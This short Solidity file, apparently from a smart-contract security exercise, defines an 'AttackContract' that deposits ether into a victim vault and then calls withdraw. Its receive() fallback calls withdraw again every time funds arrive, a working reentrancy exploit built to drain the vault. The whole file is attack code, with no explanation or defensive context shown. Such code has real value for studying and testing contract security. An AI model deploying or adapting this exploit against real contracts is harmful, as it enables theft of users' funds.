// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./IVault.sol";

contract AttackContract {
    address victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function deposit() external payable {
        IVault(victim).deposit{value: msg.value}();
    }

    function withdraw() external {
        IVault(victim).withdraw();
    }

    receive() external payable {
        try IVault(victim).withdraw() {} catch {}
    }
}